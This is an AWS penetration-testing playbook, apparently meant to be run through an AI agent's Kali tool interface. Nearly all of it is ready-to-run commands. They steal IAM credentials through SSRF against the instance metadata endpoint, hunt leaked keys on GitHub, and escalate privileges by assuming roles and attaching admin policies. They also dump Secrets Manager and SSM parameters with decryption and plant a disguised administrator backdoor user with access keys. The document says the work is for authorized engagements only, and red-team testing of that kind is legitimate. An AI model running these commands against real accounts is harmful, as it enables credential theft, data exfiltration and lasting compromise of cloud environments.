# PLAYBOOK: Cloud AWS Penetration Test
# April 2026 Red Team Stack
# External + Internal AWS attack surfaces

---

## AWS Attack Surface Overview

```
EXTERNAL EXPOSURE:
  S3 Buckets (public read/write)
  EC2 instances (exposed ports, metadata service)
  Lambda functions (API Gateway endpoints)
  RDS/database exposure
  Exposed API keys in code/config

PRIVILEGE ESCALATION (from initial access):
  IAM misconfigurations (*)
  Instance metadata v1 SSRF → credentials
  Overpermissioned roles
  Cross-account trust abuse

LATERAL MOVEMENT:
  IAM role chaining
  EC2 assume-role pivoting
  AWS Organizations abuse
  Resource-based policies
```

---

## Tools in Stack (HexStrike Cloud Profile + Kali MCP)

```
HexStrike cloud tools (20+):
  ScoutSuite, Prowler, Pacu, CloudMapper, aws-recon
  S3Scanner, CloudBrute (bucket enumeration)
  truffleHog (secret scanning)

Kali MCP direct:
  AWS CLI (aws sts, iam, ec2, s3...)
  Pacu (AWS exploitation framework)
  Boto3 scripts
  IMDSv2 exploitation tools
```

---

## PHASE 1 — EXTERNAL RECON (No Credentials)

### S3 Bucket Discovery
```bash
# Using HexStrike cloud tools:
"Using hexstrike-ai cloud profile, enumerate S3 buckets for [COMPANY_NAME]:
1. CloudBrute: [company], [company]-assets, [company]-backup, [company]-dev,
   [company]-prod, [company]-staging, [company]-data, [company]-logs,
   [company]-builds, [company]-uploads, [company]-static, [company]-media
2. Check each for: public read, public write, no auth required
3. s3scanner against all discovered buckets
Save findings to loot/[MISSION]/cloud/s3_buckets.json"

# Manual checks via Kali MCP:
kali_exec("aws s3 ls s3://[BUCKET_NAME] --no-sign-request")
kali_exec("aws s3 cp /tmp/test.txt s3://[BUCKET_NAME]/ --no-sign-request")  # Write test
```

### Exposed API Keys / Credentials
```bash
# GitHub secret scanning for AWS keys
"Using hexstrike-ai OSINT: search GitHub for AWS keys from [COMPANY].
Patterns: AKIA (access key ID), [company] + secret_access_key
Also check: npm packages, PyPI packages from [COMPANY]"

# truffleHog on discovered repos
kali_exec("trufflehog github --org=[COMPANY] --only-verified")
kali_exec("trufflehog github --repo=[REPO_URL] --only-verified")
```

### AWS Metadata Exposure via SSRF
```bash
# If SSRF found in web app — try AWS metadata endpoint
# IMDSv1 (vulnerable):
kali_exec("curl -s http://169.254.169.254/latest/meta-data/")
kali_exec("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/")
kali_exec("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]")

# IMDSv2 (requires token):
kali_exec("TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/")
```

---

## PHASE 2 — AWS ENVIRONMENT ASSESSMENT (With Credentials)

### Configure Credentials
```bash
kali_exec("aws configure")
# OR:
kali_exec("export AWS_ACCESS_KEY_ID=[KEY]")
kali_exec("export AWS_SECRET_ACCESS_KEY=[SECRET]")
kali_exec("export AWS_SESSION_TOKEN=[TOKEN]")  # If temp creds

# Verify who we are:
kali_exec("aws sts get-caller-identity")
# Returns: Account, UserID, ARN — tells you what you have
```

### ScoutSuite / Prowler Full Audit
```bash
# ScoutSuite — comprehensive cloud security assessment
kali_exec("scout aws --no-browser -r us-east-1 us-west-2 ap-southeast-2 -o loot/[MISSION]/cloud/scoutsuite/")

# Prowler — CIS benchmark + GDPR + HIPAA checks
kali_exec("prowler aws -M json -o loot/[MISSION]/cloud/prowler/ -r us-east-1")

# Parse critical findings:
kali_exec("cat loot/[MISSION]/cloud/prowler/*.json | python3 -c \"import sys,json; [print(f['title']) for f in json.load(sys.stdin) if f['status']=='FAIL' and f['severity']=='critical']\"")
```

---

## PHASE 3 — IAM PRIVILEGE ESCALATION

**The most impactful attack in AWS environments.**

### Pacu — AWS Exploitation Framework
```bash
# Start Pacu
kali_tmux_new("pacu")
kali_tmux_send("pacu", "python3 /opt/pacu/cli.py")

# In Pacu console:
# import_keys [PROFILE_NAME]
# run iam__enum_users_roles_policies_groups
# run iam__enum_permissions
# run iam__privesc_scan
# run iam__privesc_scan --all-users
```

### Manual IAM Privesc Paths

```bash
# Enumerate current permissions
kali_exec("aws iam get-user")
kali_exec("aws iam list-attached-user-policies --user-name [USERNAME]")
kali_exec("aws iam list-user-policies --user-name [USERNAME]")
kali_exec("aws iam list-groups-for-user --user-name [USERNAME]")

# Check for dangerous permissions:
kali_exec("aws iam simulate-principal-policy --policy-source-arn [ARN] --action-names iam:CreateUser iam:AttachUserPolicy iam:CreateAccessKey lambda:CreateFunction lambda:InvokeFunction ec2:RunInstances")
```

**Common IAM privesc paths:**
```
1. iam:CreateAccessKey on another user
   → Create key for admin user → full access

2. iam:CreateLoginProfile / UpdateLoginProfile
   → Set admin user's console password

3. iam:AttachUserPolicy + iam:AttachRolePolicy
   → Attach AdministratorAccess to self

4. iam:PutUserPolicy / PutGroupPolicy / PutRolePolicy
   → Add inline policy with * permissions

5. iam:AddUserToGroup
   → Add self to admin group

6. lambda:CreateFunction + lambda:InvokeFunction
   → Create Lambda with admin role → execute arbitrary code

7. ec2:RunInstances + iam:PassRole
   → Launch EC2 with admin role → access metadata endpoint
   
8. sts:AssumeRole
   → Assume more privileged role
   
9. cloudformation:CreateStack + iam:PassRole
   → Deploy stack with admin role

10. iam:CreatePolicyVersion (allows * without versioning limits)
    → Replace policy with wildcard
```

### Extract Credentials for All Roles
```bash
# List all roles
kali_exec("aws iam list-roles --output json | python3 -c \"import sys,json; [print(r['RoleName'], r['Arn']) for r in json.load(sys.stdin)['Roles']]\"")

# Try to assume each role
kali_exec("aws sts assume-role --role-arn [ROLE_ARN] --role-session-name test")

# If successful: use returned creds for higher-privilege operations
```

---

## PHASE 4 — EC2 / COMPUTE ATTACKS

```bash
# List running instances
kali_exec("aws ec2 describe-instances --output table")

# Security groups — find permissive rules
kali_exec("aws ec2 describe-security-groups --output json | python3 -c \"import sys,json; [print(sg['GroupName'], [(p.get('FromPort'), p.get('IpRanges')) for p in sg.get('IpPermissions',[])]) for sg in json.load(sys.stdin)['SecurityGroups']]\"")

# User data (may contain secrets)
kali_exec("aws ec2 describe-instance-attribute --instance-id [INSTANCE_ID] --attribute userData --query 'UserData.Value' --output text | base64 -d")

# EC2 Instance Connect (if policy allows)
kali_exec("aws ec2-instance-connect send-ssh-public-key --instance-id [ID] --instance-os-user ubuntu --ssh-public-key file://~/.ssh/id_rsa.pub")
kali_exec("ssh ubuntu@[EC2_IP]")
```

---

## PHASE 5 — DATA EXFILTRATION TARGETS

```bash
# RDS snapshots (may be public)
kali_exec("aws rds describe-db-snapshots --snapshot-type public --region us-east-1")

# S3 sensitive data scan (after access gained)
kali_exec("aws s3 ls s3://[BUCKET]/ --recursive | grep -E '\.sql|\.bak|\.env|\.pem|passwords|creds|backup'")
kali_exec("aws s3 cp s3://[BUCKET]/[FILE] /tmp/")

# Secrets Manager (if accessible)
kali_exec("aws secretsmanager list-secrets")
kali_exec("aws secretsmanager get-secret-value --secret-id [SECRET_ID]")

# Parameter Store
kali_exec("aws ssm describe-parameters")
kali_exec("aws ssm get-parameters-by-path --path '/' --recursive --with-decryption")

# CloudTrail logs (understand what's being monitored)
kali_exec("aws cloudtrail describe-trails")
kali_exec("aws cloudtrail get-trail-status --name [TRAIL_NAME]")
```

---

## PHASE 6 — PERSISTENCE

```bash
# Create backdoor user (only if explicitly in scope for red team)
kali_exec("aws iam create-user --user-name support-backup-2026")
kali_exec("aws iam attach-user-policy --user-name support-backup-2026 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess")
kali_exec("aws iam create-access-key --user-name support-backup-2026")

# NOTE: Document everything created — must clean up after engagement
# Cleanup:
kali_exec("aws iam delete-access-key --user-name support-backup-2026 --access-key-id [KEY_ID]")
kali_exec("aws iam detach-user-policy --user-name support-backup-2026 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess")
kali_exec("aws iam delete-user --user-name support-backup-2026")
```

---

## AWS Quick Reference

```bash
# Identity
aws sts get-caller-identity
aws iam get-user
aws iam list-groups-for-user --user-name $USER

# Compute
aws ec2 describe-instances
aws ec2 describe-security-groups
aws lambda list-functions

# Storage
aws s3 ls
aws s3 ls s3://[bucket]/ --recursive
aws rds describe-db-instances

# IAM
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-account-authorization-details

# Secrets
aws secretsmanager list-secrets
aws ssm describe-parameters

# Logging / Detection
aws cloudtrail describe-trails
aws guardduty list-detectors
aws config describe-configuration-recorders
```

---

*April 2026 | AWS cloud testing — authorized engagement only*
